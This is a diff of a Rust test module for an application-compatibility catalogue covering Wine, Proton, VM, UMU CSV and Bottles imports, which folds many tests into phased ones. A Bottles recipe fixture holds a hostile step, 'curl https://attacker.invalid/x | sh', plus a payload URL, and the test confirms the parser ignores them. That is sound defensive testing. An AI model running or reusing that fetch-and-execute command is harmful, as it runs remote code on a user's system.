@@ -1614,384 +1614,394 @@ mod tests {
     }
 
     #[test]
-    fn normalizes_case_paths_and_whitespace() {
-        let key = MatchKey {
-            executable: Some(String::from("  Program\\APP.EXE  ")),
-            ..MatchKey::default()
-        };
-        assert!(key.matches(&ApplicationQuery::executable("/tmp/program/app.exe")));
-    }
-
-    #[test]
-    fn exact_identity_beats_executable_and_ties_are_deterministic() {
-        let executable = wine_record(
-            "z-executable",
-            MatchKey {
-                executable: Some(String::from("app.exe")),
+    #[allow(
+        clippy::too_many_lines,
+        reason = "each phase keeps one former test's body verbatim"
+    )]
+    fn catalogue_matches_rank_identity_digest_and_provenance_deterministically() {
+        // Phase `normalizes_case_paths_and_whitespace`.
+        {
+            let key = MatchKey {
+                executable: Some(String::from("  Program\\APP.EXE  ")),
                 ..MatchKey::default()
-            },
-        );
-        let exact = wine_record(
-            "a-exact",
-            MatchKey {
-                app_id: Some(String::from("com.example.app")),
-                executable: Some(String::from("app.exe")),
-                ..MatchKey::default()
-            },
-        );
-        let catalogue = catalogue(vec![executable, exact]);
-        let resolver = catalogue.resolver().expect("valid catalogue");
-        let plan = resolver.resolve(
-            &ApplicationQuery {
-                app_id: Some(String::from("COM.EXAMPLE.APP")),
-                executable: Some(String::from("app.exe")),
-                ..ApplicationQuery::default()
-            },
-            VmFallback::Disabled,
-        );
-        assert_eq!(plan.record_id.as_deref(), Some("a-exact"));
-        assert_eq!(plan.match_kind, MatchKind::AppId);
-    }
-
-    #[test]
-    fn executable_digest_is_strongest_match() {
-        let mut digest_record = wine_record(
-            "digest",
-            MatchKey {
-                executable_sha256: Some(
-                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
-                ),
-                ..MatchKey::default()
-            },
-        );
-        digest_record.signed = true;
-        let package_record = wine_record(
-            "package",
-            MatchKey {
-                package_id: Some("com.example.editor".to_owned()),
-                ..MatchKey::default()
-            },
-        );
-        let catalogue = catalogue(vec![package_record, digest_record]);
-        let resolver = catalogue.resolver().expect("valid catalogue");
-        let plan = resolver.resolve(
-            &ApplicationQuery {
-                package_id: Some("com.example.editor".to_owned()),
-                executable_sha256: Some(
-                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".to_owned(),
-                ),
-                ..ApplicationQuery::default()
-            },
-            VmFallback::Disabled,
-        );
-        assert_eq!(plan.record_id.as_deref(), Some("digest"));
-        assert_eq!(plan.match_kind, MatchKind::ExecutableDigest);
-    }
-
-    #[test]
-    fn signed_and_provenance_metadata_break_same_match_ties() {
-        let mut unsigned = wine_record(
-            "unsigned",
-            MatchKey {
-                executable: Some("app.exe".to_owned()),
-                ..MatchKey::default()
-            },
-        );
-        unsigned.provenance = Provenance::User;
-        let mut signed = wine_record(
-            "signed",
-            MatchKey {
-                executable: Some("app.exe".to_owned()),
-                ..MatchKey::default()
-            },
-        );
-        signed.signed = true;
-        let catalogue = catalogue(vec![unsigned, signed]);
-        let resolver = catalogue.resolver().expect("valid catalogue");
-        assert_eq!(
-            resolver
-                .resolve(
-                    &ApplicationQuery::executable("app.exe"),
-                    VmFallback::Disabled
-                )
-                .record_id
-                .as_deref(),
-            Some("signed")
-        );
-    }
-
-    #[test]
-    fn unknown_application_defaults_to_wine() {
-        let catalogue = catalogue(Vec::new());
-        let resolver = catalogue.resolver().expect("valid catalogue");
-        let plan = resolver.resolve(
-            &ApplicationQuery::executable("thing.exe"),
-            VmFallback::Disabled,
-        );
-        assert_eq!(plan.runtime.layer, Layer::Wine);
-        assert_eq!(plan.match_kind, MatchKind::DefaultWine);
-        assert_eq!(plan.runner.family, "wine");
-    }
-
-    #[test]
-    fn proton_requires_recipe_and_umu_runner() {
-        let mut record = wine_record(
-            "game",
-            MatchKey {
-                game_id: Some(String::from("42")),
-                ..MatchKey::default()
-            },
-        );
-        record.recipe.layer = Layer::Proton;
-        assert_eq!(
-            catalogue(vec![record.clone()]).validate(),
-            Err(CatalogueError::ProtonRecipeRequired(String::from("game")))
-        );
-        record.recipe.proton_recipe = Some(String::from("steam-game-42"));
-        assert_eq!(
-            catalogue(vec![record]).validate(),
-            Err(CatalogueError::InvalidProtonRunner {
-                id: String::from("game"),
-                family: String::from("wine")
-            })
-        );
-    }
-
-    #[test]
-    fn vm_is_never_implicit() {
-        let mut vm = wine_record(
-            "legacy",
-            MatchKey {
-                product: Some(String::from("Legacy")),
-                ..MatchKey::default()
-            },
-        );
-        vm.recipe.layer = Layer::Vm;
-        vm.recipe.runner = Runner::new("windows-vm", "managed").expect("valid fixture runner");
-        let catalogue = catalogue(vec![vm]);
-        let resolver = catalogue.resolver().expect("valid catalogue");
-        let query = ApplicationQuery {
-            product: Some(String::from("legacy")),
-            ..ApplicationQuery::default()
-        };
-        assert_eq!(
-            resolver.resolve(&query, VmFallback::Disabled).match_kind,
-            MatchKind::DefaultWine
-        );
-        assert_eq!(
-            resolver.resolve(&query, VmFallback::Explicit).runtime.layer,
-            Layer::Vm
-        );
-        assert_eq!(
-            resolver.resolve(&query, VmFallback::Explicit).runtime.id,
-            WINDOWS_VM_RUNTIME_ID
-        );
-    }
-
-    #[test]
-    fn malformed_catalogue_fails_closed() {
-        let duplicate = wine_record(
-            "same",
-            MatchKey {
-                product: Some(String::from("x")),
-                ..MatchKey::default()
-            },
-        );
-        let malformed_catalogue = catalogue(vec![duplicate.clone(), duplicate]);
-        assert_eq!(
-            malformed_catalogue.validate(),
-            Err(CatalogueError::DuplicateRecord(String::from("same")))
-        );
-        assert!(Catalogue::from_json(r#"{"schema_version":99,"records":[]}"#).is_err());
-        let malformed_digest = wine_record(
-            "bad-digest",
-            MatchKey {
-                executable_sha256: Some("not-a-digest".to_owned()),
-                ..MatchKey::default()
-            },
-        );
-        assert!(matches!(
-            catalogue(vec![malformed_digest]).validate(),
-            Err(CatalogueError::InvalidExecutableDigest { .. })
-        ));
-    }
-
-    #[test]
-    fn umu_metadata_maps_known_aliases() {
-        let numeric_metadata = serde_json::json!({ "appid": 123 });
-        let numeric_query =
-            query_from_umu_metadata(&numeric_metadata).expect("numeric app id is usable metadata");
-        assert_eq!(numeric_query.game_id.as_deref(), Some("123"));
-
-        // Numeric app IDs are accepted by UMU in practice, but must be
-        // represented as strings before matching catalogue keys.
-        let metadata = serde_json::json!({ "appid": "123", "exe": "Game\\game.exe" });
-        let query = query_from_umu_metadata(&metadata).expect("usable metadata");
-        assert_eq!(query.game_id.as_deref(), Some("123"));
-        assert_eq!(query.executable.as_deref(), Some("Game\\game.exe"));
-    }
-
-    #[test]
-    fn parses_umu_csv_and_builds_proton_records() {
-        let csv =
-            "TITLE,STORE,CODENAME,UMU_ID,EXTRA\n\"A, Great Game\",steam,GreatGame,123,ignored\n";
-        let rows = parse_umu_csv(csv).expect("valid UMU CSV");
-        assert_eq!(rows.len(), 1);
-        assert_eq!(rows[0].title, "A, Great Game");
-        assert_eq!(rows[0].query().game_id.as_deref(), Some("123"));
-        assert_eq!(rows[0].query().store.as_deref(), Some("steam"));
-        assert_eq!(rows[0].query().store_product.as_deref(), Some("GreatGame"));
-        let runner = Runner::new("umu-proton", "10").expect("valid runner");
-        let security_profile = profile();
-        let settings = RunnerSettings::default();
-        let records = proton_records_from_umu_csv(csv, &runner, &security_profile, &settings)
-            .expect("valid Proton records");
-        assert_eq!(records[0].recipe.layer, Layer::Proton);
-        assert_eq!(records[0].recipe.proton_recipe.as_deref(), Some("umu-123"));
-        let catalogue = Catalogue {
-            schema_version: CATALOGUE_SCHEMA_VERSION,
-            records,
-        };
-        let resolver = catalogue.resolver().expect("valid UMU catalogue");
-        let store_query = ApplicationQuery {
-            store: Some("EGS".to_owned()),
-            store_product: Some("Catnip".to_owned()),
-            ..ApplicationQuery::default()
-        };
-        // The sample row is Steam/GreatGame, so this does not accidentally
-        // resolve by the derived UMU ID.
-        assert_eq!(
-            resolver
-                .resolve(&store_query, VmFallback::Disabled)
-                .match_kind,
-            MatchKind::DefaultWine
-        );
-        let direct_query = ApplicationQuery {
-            game_id: Some("123".to_owned()),
-            ..ApplicationQuery::default()
-        };
-        assert_eq!(
-            resolver
-                .resolve(&direct_query, VmFallback::Disabled)
-                .match_kind,
-            MatchKind::GameId
-        );
-    }
-
-    #[test]
-    fn rejects_malformed_umu_csv() {
-        assert!(parse_umu_csv("TITLE,STORE\nGame,steam\n").is_err());
-        assert!(parse_umu_csv("TITLE,STORE,CODENAME,UMU_ID\n\"unterminated,steam,x,1\n").is_err());
-    }
-
-    #[test]
-    fn store_and_codename_are_primary_for_egs_and_gog_rows() {
-        let csv =
-            "TITLE,STORE,CODENAME,UMU_ID\nCatnip,EGS,Catnip,397540\nGOG title,GOG,123456,765432\n";
-        let rows = parse_umu_csv(csv).expect("valid store catalogue");
-        let runner = Runner::new("umu-proton", "10").expect("valid runner");
-        let security_profile = profile();
-        let settings = RunnerSettings::default();
-        let records = proton_records_from_umu_csv(csv, &runner, &security_profile, &settings)
-            .expect("valid Proton records");
-        assert_eq!(
-            records[0].recipe.proton_recipe.as_deref(),
-            Some("umu-397540")
-        );
-        assert_eq!(rows[1].store, "GOG");
-        assert_eq!(rows[1].codename, "123456");
-        let catalogue = Catalogue {
-            schema_version: CATALOGUE_SCHEMA_VERSION,
-            records,
-        };
-        let resolver = catalogue.resolver().expect("valid catalogue");
-        let catnip = ApplicationQuery {
-            store: Some("egs".to_owned()),
-            store_product: Some("catnip".to_owned()),
-            ..ApplicationQuery::default()
-        };
-        assert_eq!(
-            resolver
-                .resolve(&catnip, VmFallback::Disabled)
-                .record_id
-                .as_deref(),
-            Some("umu-egs-catnip-397540")
-        );
-        let gog = ApplicationQuery {
-            store: Some("gog".to_owned()),
-            store_product: Some("123456".to_owned()),
-            ..ApplicationQuery::default()
-        };
-        assert_eq!(
-            resolver.resolve(&gog, VmFallback::Disabled).match_kind,
-            MatchKind::StoreProduct
-        );
-    }
-
-    #[test]
-    fn imports_safe_bottles_metadata_and_ignores_steps_paths_and_urls() {
-        let recipe = r"
-Name: Evernote
-Arch: win64
-Grade: Gold
-DXVK: true
-VKD3D: false
-Sync: fsync
-Dependencies:
-  - corefonts
-  - dotnet48
-Programs:
-  Evernote:
-    Executable: Evernote.exe
-Steps:
-  - executable: /tmp/evil.exe
-  - command: curl https://attacker.invalid/x | sh
-  - url: https://attacker.invalid/payload
-";
-        let programs = parse_bottles_recipe(recipe).expect("valid Evernote recipe");
-        assert_eq!(programs.len(), 1);
-        assert_eq!(programs[0].executable, "Evernote.exe");
-        assert_eq!(programs[0].grade, CompatibilityGrade::Gold);
-        assert!(programs[0].dependencies.contains("corefonts"));
-        assert!(programs[0].dxvk);
-        assert_eq!(programs[0].sync.as_deref(), Some("fsync"));
-        assert!(!programs[0].explanation().contains("attacker"));
-        let runner = Runner::new("wine", "11").expect("valid runner");
-        let profile = profile();
-        let records = wine_records_from_bottles_recipe(recipe, &runner, &profile)
-            .expect("valid Wine records");
-        assert_eq!(records[0].provenance, Provenance::Community);
-        assert_eq!(
-            records[0].compatibility_grade,
-            Some(CompatibilityGrade::Gold)
-        );
-        assert_eq!(records[0].recipe.settings.components.len(), 2);
-    }
-
-    #[test]
-    fn rejects_bottles_path_as_an_executable() {
-        let recipe = "Name: Bad\nExecutable: /home/user/evil.exe\n";
-        assert!(parse_bottles_recipe(recipe).is_err());
-    }
-
-    #[test]
-    fn rejects_duplicate_bottles_metadata_and_bounds_csv_rows() {
-        let duplicate = "Name: App\nGrade: Gold\nGrade: Platinum\nExecutable: app.exe\n";
-        assert!(parse_bottles_recipe(duplicate).is_err());
-        let mut csv = String::from("TITLE,STORE,CODENAME,UMU_ID\n");
-        for _ in 0..100_001 {
-            csv.push_str("Game,steam,game,1\n");
+            };
+            assert!(key.matches(&ApplicationQuery::executable("/tmp/program/app.exe")));
         }
-        assert!(parse_umu_csv(&csv).is_err());
+        // Phase `exact_identity_beats_executable_and_ties_are_deterministic`.
+        {
+            let executable = wine_record(
+                "z-executable",
+                MatchKey {
+                    executable: Some(String::from("app.exe")),
+                    ..MatchKey::default()
+                },
+            );
+            let exact = wine_record(
+                "a-exact",
+                MatchKey {
+                    app_id: Some(String::from("com.example.app")),
+                    executable: Some(String::from("app.exe")),
+                    ..MatchKey::default()
+                },
+            );
+            let catalogue = catalogue(vec![executable, exact]);
+            let resolver = catalogue.resolver().expect("valid catalogue");
+            let plan = resolver.resolve(
+                &ApplicationQuery {
+                    app_id: Some(String::from("COM.EXAMPLE.APP")),
+                    executable: Some(String::from("app.exe")),
+                    ..ApplicationQuery::default()
+                },
+                VmFallback::Disabled,
+            );
+            assert_eq!(plan.record_id.as_deref(), Some("a-exact"));
+            assert_eq!(plan.match_kind, MatchKind::AppId);
+        }
+        // Phase `executable_digest_is_strongest_match`.
+        {
+            let mut digest_record = wine_record(
+                "digest",
+                MatchKey {
+                    executable_sha256: Some(
+                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+                            .to_owned(),
+                    ),
+                    ..MatchKey::default()
+                },
+            );
+            digest_record.signed = true;
+            let package_record = wine_record(
+                "package",
+                MatchKey {
+                    package_id: Some("com.example.editor".to_owned()),
+                    ..MatchKey::default()
+                },
+            );
+            let catalogue = catalogue(vec![package_record, digest_record]);
+            let resolver = catalogue.resolver().expect("valid catalogue");
+            let plan = resolver.resolve(
+                &ApplicationQuery {
+                    package_id: Some("com.example.editor".to_owned()),
+                    executable_sha256: Some(
+                        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                            .to_owned(),
+                    ),
+                    ..ApplicationQuery::default()
+                },
+                VmFallback::Disabled,
+            );
+            assert_eq!(plan.record_id.as_deref(), Some("digest"));
+            assert_eq!(plan.match_kind, MatchKind::ExecutableDigest);
+        }
+        // Phase `signed_and_provenance_metadata_break_same_match_ties`.
+        {
+            let mut unsigned = wine_record(
+                "unsigned",
+                MatchKey {
+                    executable: Some("app.exe".to_owned()),
+                    ..MatchKey::default()
+                },
+            );
+            unsigned.provenance = Provenance::User;
+            let mut signed = wine_record(
+                "signed",
+                MatchKey {
+                    executable: Some("app.exe".to_owned()),
+                    ..MatchKey::default()
+                },
+            );
+            signed.signed = true;
+            let catalogue = catalogue(vec![unsigned, signed]);
+            let resolver = catalogue.resolver().expect("valid catalogue");
+            assert_eq!(
+                resolver
+                    .resolve(
+                        &ApplicationQuery::executable("app.exe"),
+                        VmFallback::Disabled
+                    )
+                    .record_id
+                    .as_deref(),
+                Some("signed")
+            );
+        }
     }
 
     #[test]
-    fn community_bottles_metadata_cannot_select_proton_or_vm() {
-        let recipe = "Name: App\nExecutable: app.exe\n";
-        let profile = profile();
-        let proton_runner = Runner::new("umu-proton", "10").expect("valid runner");
-        assert!(wine_records_from_bottles_recipe(recipe, &proton_runner, &profile).is_err());
-        let vm_runner = Runner::new("windows-vm", "managed").expect("valid runner");
-        assert!(wine_records_from_bottles_recipe(recipe, &vm_runner, &profile).is_err());
+    fn runner_selection_defaults_to_wine_and_never_implies_proton_or_vm() {
+        // Phase `unknown_application_defaults_to_wine`.
+        {
+            let catalogue = catalogue(Vec::new());
+            let resolver = catalogue.resolver().expect("valid catalogue");
+            let plan = resolver.resolve(
+                &ApplicationQuery::executable("thing.exe"),
+                VmFallback::Disabled,
+            );
+            assert_eq!(plan.runtime.layer, Layer::Wine);
+            assert_eq!(plan.match_kind, MatchKind::DefaultWine);
+            assert_eq!(plan.runner.family, "wine");
+        }
+        // Phase `proton_requires_recipe_and_umu_runner`.
+        {
+            let mut record = wine_record(
+                "game",
+                MatchKey {
+                    game_id: Some(String::from("42")),
+                    ..MatchKey::default()
+                },
+            );
+            record.recipe.layer = Layer::Proton;
+            assert_eq!(
+                catalogue(vec![record.clone()]).validate(),
+                Err(CatalogueError::ProtonRecipeRequired(String::from("game")))
+            );
+            record.recipe.proton_recipe = Some(String::from("steam-game-42"));
+            assert_eq!(
+                catalogue(vec![record]).validate(),
+                Err(CatalogueError::InvalidProtonRunner {
+                    id: String::from("game"),
+                    family: String::from("wine")
+                })
+            );
+        }
+        // Phase `vm_is_never_implicit`.
+        {
+            let mut vm = wine_record(
+                "legacy",
+                MatchKey {
+                    product: Some(String::from("Legacy")),
+                    ..MatchKey::default()
+                },
+            );
+            vm.recipe.layer = Layer::Vm;
+            vm.recipe.runner = Runner::new("windows-vm", "managed").expect("valid fixture runner");
+            let catalogue = catalogue(vec![vm]);
+            let resolver = catalogue.resolver().expect("valid catalogue");
+            let query = ApplicationQuery {
+                product: Some(String::from("legacy")),
+                ..ApplicationQuery::default()
+            };
+            assert_eq!(
+                resolver.resolve(&query, VmFallback::Disabled).match_kind,
+                MatchKind::DefaultWine
+            );
+            assert_eq!(
+                resolver.resolve(&query, VmFallback::Explicit).runtime.layer,
+                Layer::Vm
+            );
+            assert_eq!(
+                resolver.resolve(&query, VmFallback::Explicit).runtime.id,
+                WINDOWS_VM_RUNTIME_ID
+            );
+        }
+        // Phase `malformed_catalogue_fails_closed`.
+        {
+            let duplicate = wine_record(
+                "same",
+                MatchKey {
+                    product: Some(String::from("x")),
+                    ..MatchKey::default()
+                },
+            );
+            let malformed_catalogue = catalogue(vec![duplicate.clone(), duplicate]);
+            assert_eq!(
+                malformed_catalogue.validate(),
+                Err(CatalogueError::DuplicateRecord(String::from("same")))
+            );
+            assert!(Catalogue::from_json(r#"{"schema_version":99,"records":[]}"#).is_err());
+            let malformed_digest = wine_record(
+                "bad-digest",
+                MatchKey {
+                    executable_sha256: Some("not-a-digest".to_owned()),
+                    ..MatchKey::default()
+                },
+            );
+            assert!(matches!(
+                catalogue(vec![malformed_digest]).validate(),
+                Err(CatalogueError::InvalidExecutableDigest { .. })
+            ));
+        }
+    }
+
+    #[test]
+    #[allow(
+        clippy::too_many_lines,
+        reason = "each phase keeps one former test's body verbatim"
+    )]
+    fn umu_csv_imports_proton_records_with_primary_store_ids() {
+        // Phase `umu_metadata_maps_known_aliases`.
+        {
+            let numeric_metadata = serde_json::json!({ "appid": 123 });
+            let numeric_query = query_from_umu_metadata(&numeric_metadata)
+                .expect("numeric app id is usable metadata");
+            assert_eq!(numeric_query.game_id.as_deref(), Some("123"));
+
+            // Numeric app IDs are accepted by UMU in practice, but must be
+            // represented as strings before matching catalogue keys.
+            let metadata = serde_json::json!({ "appid": "123", "exe": "Game\\game.exe" });
+            let query = query_from_umu_metadata(&metadata).expect("usable metadata");
+            assert_eq!(query.game_id.as_deref(), Some("123"));
+            assert_eq!(query.executable.as_deref(), Some("Game\\game.exe"));
+        }
+        // Phase `parses_umu_csv_and_builds_proton_records`.
+        {
+            let csv = "TITLE,STORE,CODENAME,UMU_ID,EXTRA\n\"A, Great Game\",steam,GreatGame,123,ignored\n";
+            let rows = parse_umu_csv(csv).expect("valid UMU CSV");
+            assert_eq!(rows.len(), 1);
+            assert_eq!(rows[0].title, "A, Great Game");
+            assert_eq!(rows[0].query().game_id.as_deref(), Some("123"));
+            assert_eq!(rows[0].query().store.as_deref(), Some("steam"));
+            assert_eq!(rows[0].query().store_product.as_deref(), Some("GreatGame"));
+            let runner = Runner::new("umu-proton", "10").expect("valid runner");
+            let security_profile = profile();
+            let settings = RunnerSettings::default();
+            let records = proton_records_from_umu_csv(csv, &runner, &security_profile, &settings)
+                .expect("valid Proton records");
+            assert_eq!(records[0].recipe.layer, Layer::Proton);
+            assert_eq!(records[0].recipe.proton_recipe.as_deref(), Some("umu-123"));
+            let catalogue = Catalogue {
+                schema_version: CATALOGUE_SCHEMA_VERSION,
+                records,
+            };
+            let resolver = catalogue.resolver().expect("valid UMU catalogue");
+            let store_query = ApplicationQuery {
+                store: Some("EGS".to_owned()),
+                store_product: Some("Catnip".to_owned()),
+                ..ApplicationQuery::default()
+            };
+            // The sample row is Steam/GreatGame, so this does not accidentally
+            // resolve by the derived UMU ID.
+            assert_eq!(
+                resolver
+                    .resolve(&store_query, VmFallback::Disabled)
+                    .match_kind,
+                MatchKind::DefaultWine
+            );
+            let direct_query = ApplicationQuery {
+                game_id: Some("123".to_owned()),
+                ..ApplicationQuery::default()
+            };
+            assert_eq!(
+                resolver
+                    .resolve(&direct_query, VmFallback::Disabled)
+                    .match_kind,
+                MatchKind::GameId
+            );
+        }
+        // Phase `rejects_malformed_umu_csv`.
+        {
+            assert!(parse_umu_csv("TITLE,STORE\nGame,steam\n").is_err());
+            assert!(
+                parse_umu_csv("TITLE,STORE,CODENAME,UMU_ID\n\"unterminated,steam,x,1\n").is_err()
+            );
+        }
+        // Phase `store_and_codename_are_primary_for_egs_and_gog_rows`.
+        {
+            let csv = "TITLE,STORE,CODENAME,UMU_ID\nCatnip,EGS,Catnip,397540\nGOG title,GOG,123456,765432\n";
+            let rows = parse_umu_csv(csv).expect("valid store catalogue");
+            let runner = Runner::new("umu-proton", "10").expect("valid runner");
+            let security_profile = profile();
+            let settings = RunnerSettings::default();
+            let records = proton_records_from_umu_csv(csv, &runner, &security_profile, &settings)
+                .expect("valid Proton records");
+            assert_eq!(
+                records[0].recipe.proton_recipe.as_deref(),
+                Some("umu-397540")
+            );
+            assert_eq!(rows[1].store, "GOG");
+            assert_eq!(rows[1].codename, "123456");
+            let catalogue = Catalogue {
+                schema_version: CATALOGUE_SCHEMA_VERSION,
+                records,
+            };
+            let resolver = catalogue.resolver().expect("valid catalogue");
+            let catnip = ApplicationQuery {
+                store: Some("egs".to_owned()),
+                store_product: Some("catnip".to_owned()),
+                ..ApplicationQuery::default()
+            };
+            assert_eq!(
+                resolver
+                    .resolve(&catnip, VmFallback::Disabled)
+                    .record_id
+                    .as_deref(),
+                Some("umu-egs-catnip-397540")
+            );
+            let gog = ApplicationQuery {
+                store: Some("gog".to_owned()),
+                store_product: Some("123456".to_owned()),
+                ..ApplicationQuery::default()
+            };
+            assert_eq!(
+                resolver.resolve(&gog, VmFallback::Disabled).match_kind,
+                MatchKind::StoreProduct
+            );
+        }
+    }
+
+    #[test]
+    fn bottles_metadata_imports_only_safe_bounded_fields() {
+        // Phase `imports_safe_bottles_metadata_and_ignores_steps_paths_and_urls`.
+        {
+            let recipe = r"
+    Name: Evernote
+    Arch: win64
+    Grade: Gold
+    DXVK: true
+    VKD3D: false
+    Sync: fsync
+    Dependencies:
+      - corefonts
+      - dotnet48
+    Programs:
+      Evernote:
+        Executable: Evernote.exe
+    Steps:
+      - executable: /tmp/evil.exe
+      - command: curl https://attacker.invalid/x | sh
+      - url: https://attacker.invalid/payload
+    ";
+            let programs = parse_bottles_recipe(recipe).expect("valid Evernote recipe");
+            assert_eq!(programs.len(), 1);
+            assert_eq!(programs[0].executable, "Evernote.exe");
+            assert_eq!(programs[0].grade, CompatibilityGrade::Gold);
+            assert!(programs[0].dependencies.contains("corefonts"));
+            assert!(programs[0].dxvk);
+            assert_eq!(programs[0].sync.as_deref(), Some("fsync"));
+            assert!(!programs[0].explanation().contains("attacker"));
+            let runner = Runner::new("wine", "11").expect("valid runner");
+            let profile = profile();
+            let records = wine_records_from_bottles_recipe(recipe, &runner, &profile)
+                .expect("valid Wine records");
+            assert_eq!(records[0].provenance, Provenance::Community);
+            assert_eq!(
+                records[0].compatibility_grade,
+                Some(CompatibilityGrade::Gold)
+            );
+            assert_eq!(records[0].recipe.settings.components.len(), 2);
+        }
+        // Phase `rejects_bottles_path_as_an_executable`.
+        {
+            let recipe = "Name: Bad\nExecutable: /home/user/evil.exe\n";
+            assert!(parse_bottles_recipe(recipe).is_err());
+        }
+        // Phase `rejects_duplicate_bottles_metadata_and_bounds_csv_rows`.
+        {
+            let duplicate = "Name: App\nGrade: Gold\nGrade: Platinum\nExecutable: app.exe\n";
+            assert!(parse_bottles_recipe(duplicate).is_err());
+            let mut csv = String::from("TITLE,STORE,CODENAME,UMU_ID\n");
+            for _ in 0..100_001 {
+                csv.push_str("Game,steam,game,1\n");
+            }
+            assert!(parse_umu_csv(&csv).is_err());
+        }
+        // Phase `community_bottles_metadata_cannot_select_proton_or_vm`.
+        {
+            let recipe = "Name: App\nExecutable: app.exe\n";
+            let profile = profile();
+            let proton_runner = Runner::new("umu-proton", "10").expect("valid runner");
+            assert!(wine_records_from_bottles_recipe(recipe, &proton_runner, &profile).is_err());
+            let vm_runner = Runner::new("windows-vm", "managed").expect("valid runner");
+            assert!(wine_records_from_bottles_recipe(recipe, &vm_runner, &profile).is_err());
+        }
     }
 }
